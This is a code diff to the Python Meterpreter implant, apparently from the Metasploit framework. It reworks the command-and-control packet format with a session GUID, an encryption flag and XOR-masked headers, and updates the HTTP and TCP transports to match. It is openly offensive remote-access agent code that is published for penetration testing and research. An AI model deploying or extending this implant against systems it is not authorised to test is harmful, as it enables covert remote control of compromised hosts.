@@ -169,6 +169,18 @@ TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503
 EXPORTED_SYMBOLS = {}
 EXPORTED_SYMBOLS['DEBUGGING'] = DEBUGGING
 
+# Packet header sizes
+ENC_NONE = 0
+PACKET_XOR_KEY_SIZE = 4
+PACKET_SESSION_GUID_SIZE = 16
+PACKET_ENCRYPT_FLAG_SIZE = 4
+PACKET_LENGTH_SIZE = 4
+PACKET_TYPE_SIZE = 4
+PACKET_LENGTH_OFF = (PACKET_XOR_KEY_SIZE + PACKET_SESSION_GUID_SIZE +
+		PACKET_ENCRYPT_FLAG_SIZE)
+PACKET_HEADER_SIZE = (PACKET_XOR_KEY_SIZE + PACKET_SESSION_GUID_SIZE +
+		PACKET_ENCRYPT_FLAG_SIZE + PACKET_LENGTH_SIZE + PACKET_TYPE_SIZE)
+
 class SYSTEM_INFO(ctypes.Structure):
 	_fields_ = [("wProcessorArchitecture", ctypes.c_uint16),
 		("wReserved", ctypes.c_uint16),
@@ -515,10 +527,19 @@ class Transport(object):
 		self.communication_last = 0
 		return True
 
+	def decrypt_packet(self, pkt):
+		if pkt and len(pkt) > PACKET_HEADER_SIZE:
+			# We don't support AES encryption yet, so just do the normal
+			# XOR thing and move on
+			xor_key = struct.unpack('BBBB', pkt[:PACKET_XOR_KEY_SIZE])
+			raw = xor_bytes(xor_key, pkt)
+			return raw[PACKET_HEADER_SIZE:]
+		return None
+
 	def get_packet(self):
 		self.request_retire = False
 		try:
-			pkt = self._get_packet()
+			pkt = self.decrypt_packet(self._get_packet())
 		except:
 			debug_traceback()
 			return None
@@ -527,12 +548,20 @@ class Transport(object):
 		self.communication_last = time.time()
 		return pkt
 
+	def encrypt_packet(self, pkt):
+		# The packet now has to contain session GUID and encryption flag info
+		# And given that we're not yet supporting AES, we're going to just
+		# always return the session guid and the encryption flag set to 0
+		# TODO: we'll add encryption soon!
+		xor_key = rand_xor_key()
+		raw = binascii.a2b_hex(bytes(SESSION_GUID, 'UTF-8')) + struct.pack('>I', ENC_NONE) + pkt
+		result = struct.pack('BBBB', *xor_key) + xor_bytes(xor_key, raw)
+		return result
+
 	def send_packet(self, pkt):
 		self.request_retire = False
 		try:
-			xor_key = rand_xor_key()
-			raw = struct.pack('BBBB', *xor_key[::-1]) + xor_bytes(xor_key, pkt)
-			self._send_packet(raw)
+			self._send_packet(self.encrypt_packet(pkt))
 		except:
 			debug_traceback()
 			return False
@@ -596,13 +625,13 @@ class HttpTransport(Transport):
 		for _ in range(1):
 			if packet == '':
 				break
-			if len(packet) < 12:
+			if len(packet) < PACKET_HEADER_SIZE:
 				packet = None  # looks corrupt
 				break
-			xor_key = struct.unpack('BBBB', packet[:4][::-1])
-			header = xor_bytes(xor_key, packet[4:12])
-			pkt_length, _ = struct.unpack('>II', header)
-			if len(packet) - 4 != pkt_length:
+			xor_key = struct.unpack('BBBB', packet[:PACKET_XOR_KEY_SIZE])
+			header = xor_bytes(xor_key, packet[:PACKET_HEADER_SIZE])
+			pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF+PACKET_LENGTH_SIZE])[0] - 8
+			if len(packet) != (pkt_length + PACKET_HEADER_SIZE):
 				packet = None  # looks corrupt
 		if not packet:
 			delay = 10 * self._empty_cnt
@@ -612,7 +641,7 @@ class HttpTransport(Transport):
 			time.sleep(float(min(10000, delay)) / 1000)
 			return packet
 		self._empty_cnt = 0
-		return xor_bytes(xor_key, packet[12:])
+		return packet
 
 	def _send_packet(self, packet):
 		request = urllib.Request(self.url, packet, self._http_request_headers)
@@ -691,11 +720,11 @@ class TcpTransport(Transport):
 		self._first_packet = False
 		if not select.select([self.socket], [], [], 0.5)[0]:
 			return bytes()
-		packet = self.socket.recv(12)
+		packet = self.socket.recv(PACKET_HEADER_SIZE)
 		if packet == '':  # remote is closed
 			self.request_retire = True
 			return None
-		if len(packet) != 12:
+		if len(packet) != PACKET_HEADER_SIZE:
 			if first and len(packet) == 4:
 				received = 0
 				header = packet[:4]
@@ -707,14 +736,18 @@ class TcpTransport(Transport):
 				return self._get_packet()
 			return None
 
-		xor_key = struct.unpack('BBBB', packet[:4][::-1])
-		header = xor_bytes(xor_key, packet[4:12])
-		pkt_length, pkt_type = struct.unpack('>II', header)
+		xor_key = struct.unpack('BBBB', packet[:PACKET_XOR_KEY_SIZE])
+		# XOR the whole header first
+		header = xor_bytes(xor_key, packet[:PACKET_HEADER_SIZE])
+		# Extract just the length
+		pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF+PACKET_LENGTH_SIZE])[0]
 		pkt_length -= 8
-		packet = bytes()
-		while len(packet) < pkt_length:
-			packet += self.socket.recv(pkt_length - len(packet))
-		return xor_bytes(xor_key, packet)
+		# Read the rest of the packet
+		rest = bytes()
+		while len(rest) < pkt_length:
+			rest += self.socket.recv(pkt_length - len(rest))
+		# return the whole packet, as it's decoded separately
+		return packet + rest
 
 	def _send_packet(self, packet):
 		self.socket.send(packet)
@@ -921,13 +954,13 @@ class PythonMeterpreter(object):
 		return ERROR_SUCCESS, response
 
 	def _core_get_session_guid(self, request, response):
-		response += tlv_pack(TLV_TYPE_SESSION_GUID, SESSION_GUID)
+		response += tlv_pack(TLV_TYPE_SESSION_GUID, binascii.a2b_hex(bytes(SESSION_GUID, 'UTF-8')))
 		return ERROR_SUCCESS, response
 
 	def _core_set_session_guid(self, request, response):
 		new_guid = packet_get_tlv(request, TLV_TYPE_SESSION_GUID)
 		if new_guid:
-			SESSION_GUID = new_guid['value']
+			SESSION_GUID = binascii.b2a_hex(new_guid['value'])
 		return ERROR_SUCCESS, response
 
 	def _core_machine_id(self, request, response):
